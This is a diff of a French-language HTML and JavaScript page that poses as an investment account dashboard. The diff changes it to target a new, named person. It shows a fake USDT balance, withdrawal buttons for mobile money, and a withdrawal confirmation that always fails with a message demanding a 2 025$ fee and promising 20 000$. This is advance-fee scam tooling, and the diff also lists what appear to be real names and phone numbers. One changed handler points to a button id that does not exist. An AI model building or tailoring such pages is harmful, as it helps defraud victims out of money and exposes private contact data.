@@ -244,10 +244,11 @@
         </div>
         <nav>
             <div class="actions">
-                <span class="balance">Solde: 32 101,000 USDT</span>
+                <span class="balance">Solde: 4 030,000 USDT</span>
                 <div class="account-info">
-                    <span>ANTSOLU MAGLOIRE</span><br>
-                    <span>077147833</span>
+                    <span>ANAAMI M’AMIkITU</span><br>
+                    <span>+243999911882</span>
+                    <span>+243821096929</span>
                 </div>
                 <button>Déconnexion</button>
             </div>
@@ -275,13 +276,13 @@
             </div>
             <div class="withdrawal-options">
                 <button id="airtel-money">Retrait via Airtel Money</button>
-                <button id="moov-money">Retrait via Moov Money</button>
+                <button id="moov-money">Retrait via M-pesa</button>
             </div>
             <div class="withdrawal-form" id="withdrawal-form">
                 <h3>Confirmer le retrait</h3>
                 <div class="info">
-                    <p>Nom: ANTSOLU MAGLOIRE</p>
-                    <p>Numéro: 24177147833</p>
+                    <p>Nom: ANAAMI M’AMIkITU</p>
+                    <p>Numéro: +243999911882</p>
                 </div>
                 <button id="confirm-withdrawal">Valider le Retrait</button>
             </div>
@@ -313,13 +314,13 @@
                 errorMessage.textContent = '';
             });
 
-            document.getElementById('moov-money').addEventListener('click', () => {
+            document.getElementById('M-pesa').addEventListener('click', () => {
                 withdrawalForm.style.display = 'flex';
                 errorMessage.textContent = '';
             });
 
             document.getElementById('confirm-withdrawal').addEventListener('click', () => {
-                errorMessage.textContent = 'Erreur : Veuillez régler vos frais aupres de Global investissement pour entrer en possession de vos bénéfices.';
+                errorMessage.textContent = 'Erreur : Madame NAAMI vos 4 030$ sont bloqué pour non conformite des modalités de transfert alors nous sommes en attente de vos 2 025$ pour le lancement de votre investissement qui vous donnera 20 000$ plus vos 4 030$.';
                 withdrawalForm.style.display = 'none';
             });
 
